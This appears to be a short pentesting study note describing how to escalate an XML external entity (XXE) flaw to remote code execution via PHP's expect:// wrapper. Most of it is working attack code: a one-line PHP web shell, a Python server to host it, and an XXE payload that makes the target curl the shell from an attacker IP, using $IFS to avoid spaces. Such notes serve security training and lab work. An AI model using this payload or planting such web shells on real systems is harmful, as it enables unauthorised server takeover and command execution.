---
Primary_category: "[[XXE]]"
title: "XXE - RCE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[XXE]]

#### *PHP Extension - Expect*

As with ***[[LFI]]***, an operator could gain *RCE* through an *XXE* vulnerability, namely by using a ***PHP Expect Extension***

This *PHP* wrapper allows system command execution, as we can see ***[[LFI TO RCE - PHP WRAPPERS#Expect|here]]***

So, we could upload a *web shell* for greater flexibility since we are quite limited in terms of command execution syntax within the *XML* declaration

##### *Creating a Web Shell*

```bash
echo -n '<?php system($_GET[0]); ?>' > shell.php
```

##### *Setting up an HTTP Server*

```bash
python -m http.server 80
```

##### *Uploading the Shell to the target through the XXE*

```bash
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [
		<!ENTITY bar SYSTEM "expect://curl$IFS-O$IFS10.10.10.5/shell.php"
	]>
...<SNIP>...
	<email>
		&bar;
	</email>
```